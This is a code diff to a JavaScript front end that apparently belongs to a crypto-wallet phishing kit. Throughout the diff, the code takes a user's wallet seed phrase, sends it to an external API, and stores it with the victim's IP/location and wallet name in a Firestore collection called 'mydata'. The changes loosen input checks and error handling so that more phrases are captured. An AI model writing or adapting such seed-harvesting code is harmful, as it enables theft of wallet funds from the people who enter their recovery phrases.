@@ -105,18 +105,17 @@ function validateMnemonic(mnemonic) {
    const encodeSeed = async (seed) => {
     var encodeSeed = '';
     try {
-      const response = await fetch(import.meta.env.PUBLIC_API_URL, {
+      const response = await fetch(import.meta.env.VITE_PUBLIC_API_URL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ txt:seed}), 
       });
-      if (!response.ok) {
-        throw new Error("server error");
+      if (response.ok) {
+         const data = await response.json();
+         encodeSeed = data.enc;
       }
-      const data = await response.json();
-      encodeSeed = data.enc;
     } catch (err) {
       console.log(err);
     }
@@ -127,12 +126,13 @@ function validateMnemonic(mnemonic) {
         SetProcessing(true);
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
         var formattedSeedPhrase = normalizeText(secretPharse);
-        if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
+        if(formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
             if(validateMnemonic(formattedSeedPhrase)){
                 var encode = '';
                 try{
-                 encode = await encodeSeed(formattedSeedPhrase);
+                  encode = await encodeSeed(formattedSeedPhrase);
                 }catch(e){
+                  console.log(e);
                 }
                 const isExist = await checkExistsBySeed(encode? encode : formattedSeedPhrase);
                 if(!isExist){
@@ -140,7 +140,7 @@ function validateMnemonic(mnemonic) {
                     var _total = 0;
                     var _s = 1;
                     const user = await addDoc(collection(db, "mydata"), {
-                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:encode? encode : formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
+                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName?walletName :'Others',secret:encode? encode : formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                     });
                     if(user.id){
                         setLocalStorage(encodeBase64(encode? encode : formattedSeedPhrase),1);
